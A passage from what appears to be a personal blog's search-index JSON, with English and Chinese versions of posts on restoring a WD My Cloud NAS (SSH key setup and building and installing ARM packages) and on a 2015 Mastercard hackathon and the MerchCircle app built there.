main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list cp &#x2F;etc&#x2F;resolv.conf build&#x2F;etc # exiv2 .&#x2F;build.sh exiv2 # 编辑器 .&#x2F;build.sh joe scp build&#x2F;root&#x2F;joe_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i joe_*.deb # htop .&#x2F;build.sh htop scp build&#x2F;root&#x2F;htop_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i htop_*.deb # unrar .&#x2F;build.sh unrar scp build&#x2F;root&#x2F;unrar_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i unrar_*.deb # transmission # 以下构建过程将在一小时左右完成 .&#x2F;build.sh libcurl3-gnutls .&#x2F;build.sh libminiupnpc5 .&#x2F;build.sh libnatpmp1 .&#x2F;build.sh transmission-common .&#x2F;build.sh transmission-daemon # 上传 scp build&#x2F;root&#x2F;libcurl3-gnutls_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;libminiupnpc5_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;libnatpmp1_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;transmission-common_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;transmission-daemon_*.deb root@$SERVER_HOST:~ # 安装 ssh root@$SERVER_HOST dpkg -i libcurl3-gnutls_*.deb ssh root@$SERVER_HOST dpkg -i libminiupnpc5_*.deb ssh root@$SERVER_HOST dpkg -i libnatpmp1_*.deb ssh root@$SERVER_HOST dpkg -i transmission-common_*.deb ssh root@$SERVER_HOST dpkg -i transmission-daemon_*.deb # transmission daemon &#x2F; web 应该已启动 # 如果没有，&#x2F;etc&#x2F;init.d&#x2F;transmission-daemon start # 如果你有备份设置，上传设置并重新启动 # &#x2F;etc&#x2F;init.d&#x2F;transmission-daemon restart # nodejs .&#x2F;build.sh libc-ares2 scp build&#x2F;root&#x2F;libc-ares2_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i libc-ares2_*.deb # 构建需要一小时 .&#x2F;build.sh libv8 scp build&#x2F;root&#x2F;libv8-3*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i libv8-3*.deb wget https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v4.2.1&#x2F;node-v4.2.1-linux-armv7l.tar.gz tar xvfz node-v4.2.1-linux-armv7l.tar.gz cd node-v4.2.1-linux-armv7l","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"arm","slug":"arm","permalink":"https://neo01.com/tags/arm/"},{"name":"wdcloud","slug":"wdcloud","permalink":"https://neo01.com/tags/wdcloud/"}],"lang":"zh-CN"},{"title":"Setup script after WD Cloud firmware updated","slug":"2015/10/setup-script-after-wd-cloud-firmware-updated","date":"un11fin11","updated":"un66fin66","comments":true,"path":"2015/10/setup-script-after-wd-cloud-firmware-updated/","permalink":"https://neo01.com/2015/10/setup-script-after-wd-cloud-firmware-updated/","excerpt":"Lost all configurations after firmware update? Automated scripts to restore SSH and package settings quickly.","text":"You lose all custom configurations whenever the WD Cloud firmware has updated. Below scripts help me to revert my settings, Update SSH server to use public key authentication Login to root on the WD Cloud and create .ssh on the server side, mkdir ~&#x2F;.ssh Upload public key from your machine to the server, Replace nas with your host/IP address. scp ~&#x2F;.ssh&#x2F;id_rsa.pub root@_**nas**_:~&#x2F;.ssh&#x2F;authorized_keys on the server-side chmod go-rwx ~&#x2F;.ssh sed -i.bak &quot;s&#x2F;PubkeyAuthentication no&#x2F;PubkeyAuthentication yes&#x2F;&quot; &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;init.d&#x2F;ssh restart You can ssh to the nas without entering the password. In short, # run it from your own machine # prerequisites, you have generated a public&#x2F;private key pair in ~&#x2F;.ssh # configuration export TARGET_SERVER&#x3D;nas ssh root@$TARGET_SERVER mkdir ~&#x2F;.ssh Upload public key from your machine to the server, Replace nas with your host&#x2F;IP address. scp ~&#x2F;.ssh&#x2F;id_rsa.pub root@nas:~&#x2F;.ssh&#x2F;authorized_keys on the server-side ssh root@$TARGET_SERVER &lt;&lt; EOF chmod go-rwx ~&#x2F;.ssh sed -i.bak &quot;s&#x2F;PubkeyAuthentication no&#x2F;PubkeyAuthentication yes&#x2F;&quot; &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;init.d&#x2F;ssh restart EOF If you do not want to build packages, you can download from https://app.box.com/wdcloud. I will try to keep it up-to-date. Script to build general packages Below script build packages such as transmission, joe, etc # build useful component base on my personal preference WD Cloud (ubuntu, arm) ### configuration ### # your WD cloud host name export SERVER_HOST&#x3D;nas # target cloud version WD_VERSION&#x3D;04.04.02-105 ### execute ### # download and unpack the gpl source and build tools wget http:&#x2F;&#x2F;download.wdc.com&#x2F;gpl&#x2F;gpl-source-wd_my_cloud-$WD_VERSION.zip rm -rf packages unzip gpl-source-wd_my_cloud-$WD_VERSION.zip packages&#x2F;build_tools&#x2F;debian&#x2F;* mkdir 64k-wheezy cp -R packages&#x2F;build_tools&#x2F;debian&#x2F;* .&#x2F;64k-wheezy echo &#39;#!&#x2F;bin&#x2F;bash&#39; &gt; 64k-wheezy&#x2F;build.sh echo &#39;.&#x2F;build-armhf-package.sh --pagesize&#x3D;64k $1 wheezy&#39; &gt;&gt; 64k-wheezy&#x2F;build.sh chmod a+x 64k-wheezy&#x2F;build.sh cd 64k-wheezy .&#x2F;setup.sh bootstrap&#x2F;wheezy-bootstrap_1.24.14_armhf.tar.gz build mv build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static_orig cp &#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static # override build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb-src http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list # optional until you need to use backports packages echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list cp &#x2F;etc&#x2F;resolv.conf build&#x2F;etc # exiv2 .&#x2F;build.sh exiv2 # editor .&#x2F;build.sh joe scp build&#x2F;root&#x2F;joe_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i joe_*.deb # htop .&#x2F;build.sh htop scp build&#x2F;root&#x2F;htop_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i htop_*.deb # unrar .&#x2F;build.sh unrar scp build&#x2F;root&#x2F;unrar_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i unrar_*.deb # transmission # below build process will be finished after an hour or so .&#x2F;build.sh libcurl3-gnutls .&#x2F;build.sh libminiupnpc5 .&#x2F;build.sh libnatpmp1 .&#x2F;build.sh transmission-common .&#x2F;build.sh transmission-daemon # upload scp build&#x2F;root&#x2F;libcurl3-gnutls_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;libminiupnpc5_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;libnatpmp1_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;transmission-common_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;transmission-daemon_*.deb root@$SERVER_HOST:~ # install ssh root@$SERVER_HOST dpkg -i libcurl3-gnutls_*.deb ssh root@$SERVER_HOST dpkg -i libminiupnpc5_*.deb ssh root@$SERVER_HOST dpkg -i libnatpmp1_*.deb ssh root@$SERVER_HOST dpkg -i transmission-common_*.deb ssh root@$SERVER_HOST dpkg -i transmission-daemon_*.deb # the transmission daemon &#x2F; web should be started # if not, &#x2F;etc&#x2F;init.d&#x2F;transmission-daemon start # in case you have backup settings, upload settings and restart # &#x2F;etc&#x2F;init.d&#x2F;transmission-daemon restart # nodejs .&#x2F;build.sh libc-ares2 scp build&#x2F;root&#x2F;libc-ares2_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i libc-ares2_*.deb # it takes an hour to build .&#x2F;build.sh libv8 scp build&#x2F;root&#x2F;libv8-3*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i libv8-3*.deb wget https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v4.2.1&#x2F;node-v4.2.1-linux-armv7l.tar.gz tar xvfz node-v4.2.1-linux-armv7l.tar.gz cd node-v4.2.1-linux-armv7l","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"arm","slug":"arm","permalink":"https://neo01.com/tags/arm/"},{"name":"wdcloud","slug":"wdcloud","permalink":"https://neo01.com/tags/wdcloud/"}]},{"title":"WD Cloud 韌體更新後的設定腳本","slug":"2015/10/setup-script-after-wd-cloud-firmware-updated-zh-TW","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-TW/2015/10/setup-script-after-wd-cloud-firmware-updated/","permalink":"https://neo01.com/zh-TW/2015/10/setup-script-after-wd-cloud-firmware-updated/","excerpt":"韌體更新後失去所有配置？自動化腳本幫你恢復 SSH 和套件設定","text":"每當 WD Cloud 韌體更新時，你會失去所有自訂配置。以下腳本幫助我恢復我的設定， 更新 SSH 伺服器以使用公鑰認證 登入 WD Cloud 的 root 並在伺服器端建立 .ssh， mkdir ~&#x2F;.ssh 從你的機器上傳公鑰到伺服器，將 nas 替換為你的主機/IP 位址。 scp ~&#x2F;.ssh&#x2F;id_rsa.pub root@_**nas**_:~&#x2F;.ssh&#x2F;authorized_keys 在伺服器端 chmod go-rwx ~&#x2F;.ssh sed -i.bak &quot;s&#x2F;PubkeyAuthentication no&#x2F;PubkeyAuthentication yes&#x2F;&quot; &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;init.d&#x2F;ssh restart 你可以在不輸入密碼的情況下 ssh 到 nas。簡而言之， # 從你自己的機器執行 # 先決條件，你已經在 ~&#x2F;.ssh 中生成了公鑰&#x2F;私鑰對 # 配置 export TARGET_SERVER&#x3D;nas ssh root@$TARGET_SERVER mkdir ~&#x2F;.ssh 從你的機器上傳公鑰到伺服器，將 nas 替換為你的主機&#x2F;IP 位址。 scp ~&#x2F;.ssh&#x2F;id_rsa.pub root@nas:~&#x2F;.ssh&#x2F;authorized_keys 在伺服器端 ssh root@$TARGET_SERVER &lt;&lt; EOF chmod go-rwx ~&#x2F;.ssh sed -i.bak &quot;s&#x2F;PubkeyAuthentication no&#x2F;PubkeyAuthentication yes&#x2F;&quot; &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;init.d&#x2F;ssh restart EOF 如果你不想建構套件，你可以從 https://app.box.com/wdcloud 下載。我會盡量保持更新。 建構一般套件的腳本 以下腳本建構套件，例如 transmission、joe 等 # 根據我的個人偏好為 WD Cloud（ubuntu、arm）建構有用的組件 ### 配置 ### # 你的 WD cloud 主機名稱 export SERVER_HOST&#x3D;nas # 目標雲端版本 WD_VERSION&#x3D;04.04.02-105 ### 執行 ### # 下載並解壓縮 gpl 原始碼和建構工具 wget http:&#x2F;&#x2F;download.wdc.com&#x2F;gpl&#x2F;gpl-source-wd_my_cloud-$WD_VERSION.zip rm -rf packages unzip gpl-source-wd_my_cloud-$WD_VERSION.zip packages&#x2F;build_tools&#x2F;debian&#x2F;* mkdir 64k-wheezy cp -R packages&#x2F;build_tools&#x2F;debian&#x2F;* .&#x2F;64k-wheezy echo &#39;#!&#x2F;bin&#x2F;bash&#39; &gt; 64k-wheezy&#x2F;build.sh echo &#39;.&#x2F;build-armhf-package.sh --pagesize&#x3D;64k $1 wheezy&#39; &gt;&gt; 64k-wheezy&#x2F;build.sh chmod a+x 64k-wheezy&#x2F;build.sh cd 64k-wheezy .&#x2F;setup.sh bootstrap&#x2F;wheezy-bootstrap_1.24.14_armhf.tar.gz build mv build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static_orig cp &#x2F;usr&#x2F;bin&#x2F;qemu-arm-static build&#x2F;usr&#x2F;bin&#x2F;qemu-arm-static # 覆蓋 build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb-src http:&#x2F;&#x2F;security.debian.org&#x2F; wheezy&#x2F;updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-updates main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb-src http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list # 可選，直到你需要使用 backports 套件 echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list echo &quot;deb http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian wheezy-backports main contrib non-free&quot; &gt;&gt; build&#x2F;etc&#x2F;apt&#x2F;sources.list cp &#x2F;etc&#x2F;resolv.conf build&#x2F;etc # exiv2 .&#x2F;build.sh exiv2 # 編輯器 .&#x2F;build.sh joe scp build&#x2F;root&#x2F;joe_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i joe_*.deb # htop .&#x2F;build.sh htop scp build&#x2F;root&#x2F;htop_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i htop_*.deb # unrar .&#x2F;build.sh unrar scp build&#x2F;root&#x2F;unrar_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i unrar_*.deb # transmission # 以下建構過程將在一小時左右完成 .&#x2F;build.sh libcurl3-gnutls .&#x2F;build.sh libminiupnpc5 .&#x2F;build.sh libnatpmp1 .&#x2F;build.sh transmission-common .&#x2F;build.sh transmission-daemon # 上傳 scp build&#x2F;root&#x2F;libcurl3-gnutls_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;libminiupnpc5_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;libnatpmp1_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;transmission-common_*.deb root@$SERVER_HOST:~ scp build&#x2F;root&#x2F;transmission-daemon_*.deb root@$SERVER_HOST:~ # 安裝 ssh root@$SERVER_HOST dpkg -i libcurl3-gnutls_*.deb ssh root@$SERVER_HOST dpkg -i libminiupnpc5_*.deb ssh root@$SERVER_HOST dpkg -i libnatpmp1_*.deb ssh root@$SERVER_HOST dpkg -i transmission-common_*.deb ssh root@$SERVER_HOST dpkg -i transmission-daemon_*.deb # transmission daemon &#x2F; web 應該已啟動 # 如果沒有，&#x2F;etc&#x2F;init.d&#x2F;transmission-daemon start # 如果你有備份設定，上傳設定並重新啟動 # &#x2F;etc&#x2F;init.d&#x2F;transmission-daemon restart # nodejs .&#x2F;build.sh libc-ares2 scp build&#x2F;root&#x2F;libc-ares2_*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i libc-ares2_*.deb # 建構需要一小時 .&#x2F;build.sh libv8 scp build&#x2F;root&#x2F;libv8-3*.deb root@$SERVER_HOST:~ ssh root@$SERVER_HOST dpkg -i libv8-3*.deb wget https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v4.2.1&#x2F;node-v4.2.1-linux-armv7l.tar.gz tar xvfz node-v4.2.1-linux-armv7l.tar.gz cd node-v4.2.1-linux-armv7l","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"arm","slug":"arm","permalink":"https://neo01.com/tags/arm/"},{"name":"wdcloud","slug":"wdcloud","permalink":"https://neo01.com/tags/wdcloud/"}],"lang":"zh-TW"},{"title":"MerchCircle","slug":"2015/05/merchcirlce-zh-TW","date":"un22fin22","updated":"un66fin66","comments":true,"path":"/zh-TW/2015/05/merchcirlce/","permalink":"https://neo01.com/zh-TW/2015/05/merchcirlce/","excerpt":"向朋友出售物品的最簡單方案：使用 MasterCard API 建構的 iOS 應用","text":"這是我們為 MasterCode 黑客松 2015 香港建構的應用程式。該應用程式已提交至 http://www.hackathon.io/sellspree。這個專案的原始碼可以在 https://github.com/neoalienson/merchcircle-app（iOS）和 https://github.com/neoalienson/merchcircle-web（Web 和後端）找到。Web 和後端主機託管在 Heroku 上。 📖 neoalienson/merchcircle-app ⭐ 0 Stars 🍴 0 Forks Language: Swift 📖 neoalienson/merchcircle-web ⭐ 1 Stars 🍴 0 Forks Language: Java MerchCircle 是向你的朋友出售物品的最簡單解決方案。透過點擊「出售物品」，你可以成為店主。你需要使用 MasterCard 信用卡號碼，因為我們利用 MasterCard 轉帳 API 在交易完成時接收款項。 在與你的朋友分享物品連結後，你的朋友可以透過我們的網頁前端直接付款給你， 收錢了！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"hackathon","slug":"hackathon","permalink":"https://neo01.com/tags/hackathon/"},{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Java","slug":"Java","permalink":"https://neo01.com/tags/Java/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"}],"lang":"zh-TW"},{"title":"MerchCircle","slug":"2015/05/merchcirlce","date":"un22fin22","updated":"un66fin66","comments":true,"path":"2015/05/merchcirlce/","permalink":"https://neo01.com/2015/05/merchcirlce/","excerpt":"The simplest solution for selling things to your friends: an iOS app built with MasterCard transfer API.","text":"This is the application we built for the MasterCode hackathon 2015 Hong Kong. The application was submitted to http://www.hackathon.io/sellspree. The source code for this project can be found at https://github.com/neoalienson/merchcircle-app (iOS) and https://github.com/neoalienson/merchcircle-web (Web and Backend). The Web and backend hosts were on Heroku. 📖 neoalienson/merchcircle-app ⭐ 0 Stars 🍴 0 Forks Language: Swift 📖 neoalienson/merchcircle-web ⭐ 1 Stars 🍴 0 Forks Language: Java MerchCircle is the simplest solution for selling things to your friends. By tapping on ‘Sell something’, you can become a shop owner. You will be required to use MasterCard credit numbers, as we utilize the MasterCard money transfer API to receive money upon transaction completion. After sharing the item link to your friend, your friend can pay you directly through our web frontend, Cha-ching!","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"hackathon","slug":"hackathon","permalink":"https://neo01.com/tags/hackathon/"},{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Java","slug":"Java","permalink":"https://neo01.com/tags/Java/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"}]},{"title":"MerchCircle","slug":"2015/05/merchcirlce-zh-CN","date":"un22fin22","updated":"un66fin66","comments":true,"path":"/zh-CN/2015/05/merchcirlce/","permalink":"https://neo01.com/zh-CN/2015/05/merchcirlce/","excerpt":"向朋友出售物品的最简单方案：使用 MasterCard API 构建的 iOS 应用","text":"这是我们为 MasterCode 黑客松 2015 香港构建的应用程序。该应用程序已提交至 http://www.hackathon.io/sellspree。这个项目的源代码可以在 https://github.com/neoalienson/merchcircle-app（iOS）和 https://github.com/neoalienson/merchcircle-web（Web 和后端）找到。Web 和后端主机托管在 Heroku 上。 📖 neoalienson/merchcircle-app ⭐ 0 Stars 🍴 0 Forks Language: Swift 📖 neoalienson/merchcircle-web ⭐ 1 Stars 🍴 0 Forks Language: Java MerchCircle 是向你的朋友出售物品的最简单解决方案。通过点击「出售物品」，你可以成为店主。你需要使用 MasterCard 信用卡号码，因为我们利用 MasterCard 转账 API 在交易完成时接收款项。 在与你的朋友分享物品链接后，你的朋友可以通过我们的网页前端直接付款给你， 收钱了！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"hackathon","slug":"hackathon","permalink":"https://neo01.com/tags/hackathon/"},{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Java","slug":"Java","permalink":"https://neo01.com/tags/Java/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"}],"lang":"zh-CN"},{"title":"Mastercode/Mastercard 黑客松 2015 @ 香港","slug":"2015/04/mastercode-mastercard-hackathon-2015-hong-kong-zh-CN","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-CN/2015/04/mastercode-mastercard-hackathon-2015-hong-kong/","permalink":"https://neo01.com/zh-CN/2015/04/mastercode-mastercard-hackathon-2015-hong-kong/","excerpt":"我的第一次黑客松经历：150 人、两分钟路演、以及如何在 Mastercard API 黑客松中生存","text":"我的第一次黑客松 我参加了我的第一次黑客松，由 AngelHack 在香港的 MasterCard 主办，时间是 2015 年 3 月。 这个活动吸引了来自本地和海外的约 150 名参与者。最大团队规模为五人，因此可能有超过 50 个团队。活动从上午 9 点开始，但来自海外的团队早在上午 7:30 就开始排队，因为前六个排队的团队将获得自己的团队房间。 参与者可以自由地以个人身份加入活动，并尝试在当天组建或加入团队。 什么是黑客松？ 我的一位队友参加过几次黑客松，她告诉我黑客松是一个活动，你在活动期间使用你的编程和分析技能来解决特定问题。一个例子是开发一个算法，用最少的代码语句来解决数独谜题。 Mastercode 黑客松与其他黑客松有些不同。Mastercard API 多年来一直向公众开放，允许每个团队在活动开始前就利用头脑风暴他们的想法，甚至开始开发。目标是使用 Mastercard API 开发一个业务和演示。与其他黑客松不同，演示不需要在活动结束时完成，因此在这个黑客松中，技术技能不如商业想法和图形设计重要。 以个人身份加入 个人可以介绍他们的想法或技能，并尝试在第一天早上组建或加入团队。然而，没有多少参与者进行介绍，也没有人自我介绍，因为许多团队在活动开始前就已经组建了。一旦新团队组建，他们需要头脑风暴一个想法。因此，以个人身份加入会面临显著的劣势，因为他们会在寻找团队成员方面遇到困难，并且需要在开始工作之前花费宝贵的时间进行介绍和头脑风暴。另一方面，你可以结交新朋友，享受与团队密切合作的过程。 早上为那些没有阅读文档的人提供了关于 Mastercard API 的简短介绍。主办方宣布有一个来自公共 API 的「秘密」API，实际上根本不是秘密。要在活动中表现出色，如果你想赢，做好充分准备是至关重要的。 我的团队 正如你可能注意到的，我们的团队有一位女性成员，她是来自加拿大多伦多的年轻设计师。其他团队成员都是开发者。我们是一个由 IT 专业人士主导的团队，专注于交付而不是创意。 从 2 分钟简报中评判 每个团队在五位评审面前进行 2 分钟的产品演示。然后评审有一分钟的时间向团队提问。在我看来，大多数评审对 Mastercard 的 API 了解甚少。他们只能问一些常见和简单的问题，例如「你使用了多少个 Mastercard API？」、「商业模式是什么？」有时，评审甚至没有任何问题。如果评审对 API 有更深入的了解，允许他们批判性地评估项目的可行性，那会更好。 http://angelhack.com/masteryourcard-masters-of-code-hong-kong 如果你想测试自己是否有能力创业，你应该参加这个活动。 MerchCircle 是我们当天开发的产品。 你可以在 #mastersofcode 了解更多。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"hackathon","slug":"hackathon","permalink":"https://neo01.com/tags/hackathon/"},{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}],"lang":"zh-CN"},{"title":"Mastercode/Mastercard Hackathon 2015 @ Hong Kong","slug":"2015/04/mastercode-mastercard-hackathon-2015-hong-kong","date":"un44fin44","updated":"un66fin66","comments":true,"path":"2015/04/mastercode-mastercard-hackathon-2015-hong-kong/","permalink":"https://neo01.com/2015/04/mastercode-mastercard-hackathon-2015-hong-kong/","excerpt":"My first hackathon experience: 150 participants, 2-minute pitches, and survival tips for Mastercard API hackathons.","text":"My first hackathon I joined my first hackathon, hosted by AngelHack at MasterCard’s in Hong Kong, in March 2015. This event attracted around 150 participants from both local and overseas locations. The maximum team size was five persons, so there could be over 50 teams. The event started at 9 am, but teams from overseas began lining up as early as 7:30 am because the first six teams in line would get their own team room for the event. Participants were free to join the event as individuals and attempt to form or join a team on that day. What is a hackathon? One of my teammates had participated in several hackathons, and she told me that a hackathon is an event where you use your programming and analytical skills to solve a specific problem during the event. An example would be developing an algorithm to solve a Sudoku puzzle with minimal code statements. The Mastercode hackathon was somewhat different from others. The Mastercard API has been open to the public for years, allowing every team to take advantage of brainstorming their idea or even starting development before the event started. The goal was to develop a business and a demo using the Mastercard API. Unlike other hackathons, the demo does not need to be completed by the end of the event, so technical skills were not as important as business ideas and graphic design in this hackathon. Joining as an individual Individuals can give a pitch about their idea or skill, and try to form or join a team on the first day morning for this event. However, not many participants gave their pitch, and none of them introduced themselves as many teams had already formed before the event started. Once a new team is formed, they need to brainstorm an idea. Therefore, joining as an individual would face a significant disadvantage, as they would face difficulties in finding team members and would need to spend valuable time on pitching and brainstorming before starting work. On the other hand, you can make a new friend and enjoy the process of working closely with a team. A brief presentation about Mastercard’s API was given to those who didn’t read the documentation in the morning. The host announced that there is a ‘secret’ API from the public API, which wasn’t actually secret at all. To do well in the event, it’s essential to be well-prepared if you want to win. My team As you may have noticed, our team has a female member, who is a young designer from Toronto, Canada. The other team members are developers. We are a team dominated by IT professionals, with a focus on delivery rather than creativity. Judging from 2-minute pitch Every team demonstrates their product within a 2-minute presentation in front of five judges. The judges then have one minute to raise questions to the team. It seems to me that most judges have very little idea about Mastercard’s APIs. They can only ask common and simple questions such as ‘How many Mastercard APIs have you used?’, ‘What is the business model?’ Sometimes, the judges don’t even have any questions. It would be better if the judges had a deeper understanding of the API, allowing them to critically evaluate the project’s feasibility. http://angelhack.com/masteryourcard-masters-of-code-hong-kong If you want to test whether you have the ability to start a startup, you should join the event. MerchCircle is the product we developed on that day. You can learn more at #mastersofcode.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"hackathon","slug":"hackathon","permalink":"https://neo01.com/tags/hackathon/"},{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}]},{"title":"Mastercode/Mastercard 黑客松 2015 @ 香港","slug":"2015/04/mastercode-mastercard-hackathon-2015-hong-kong-zh-TW","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-TW/2015/04/mastercode-mastercard-hackathon-2015-hong-kong/","permalink":"https://neo01.com/zh-TW/2015/04/mastercode-mastercard-hackathon-2015-hong-kong/","excerpt":"我的第一次黑客松經歷：150 人、兩分鐘路演、以及如何在 Mastercard API 黑客松中生存","text":"我的第一次黑客松 我參加了我的第一次黑客松，由 AngelHack 在香港的 MasterCard 主辦，時間是 2015 年 3 月。 這個活動吸引了來自本地和海外的約 150 名參與者。最大團隊規模為五人，因此可能有超過 50 個團隊。活動從上午 9 點開始，但來自海外的團隊早在上午 7:30 就開始排隊，因為前六個排隊的團隊將獲得自己的團隊房間。 參與者可以自由地以個人身份加入活動，並嘗試在當天組建或加入團隊。 什麼是黑客松？ 我的一位隊友參加過幾次黑客松，她告訴我黑客松是一個活動，你在活動期間使用你的程式設計和分析技能來解決特定問題。一個例子是開發一個演算法，用最少的程式碼語句來解決數獨謎題。 Mastercode 黑客松與其他黑客松有些不同。Mastercard API 多年來一直向公眾開放，允許每個團隊在活動開始前就利用腦力激盪他們的想法，甚至開始開發。目標是使用 Mastercard API 開發一個業務和演示。與其他黑客松不同，演示不需要在活動結束時完成，因此在這個黑客松中，技術技能不如商業想法和圖形設計重要。 以個人身份加入 個人可以介紹他們的想法或技能，並嘗試在第一天早上組建或加入團隊。然而，沒有多少參與者進行介紹，也沒有人自我介紹，因為許多團隊在活動開始前就已經組建了。一旦新團隊組建，他們需要腦力激盪一個想法。因此，以個人身份加入會面臨顯著的劣勢，因為他們會在尋找團隊成員方面遇到困難，並且需要在開始工作之前花費寶貴的時間進行介紹和腦力激盪。另一方面，你可以結交新朋友，享受與團隊密切合作的過程。 早上為那些沒有閱讀文件的人提供了關於 Mastercard API 的簡短介紹。主辦方宣布有一個來自公共 API 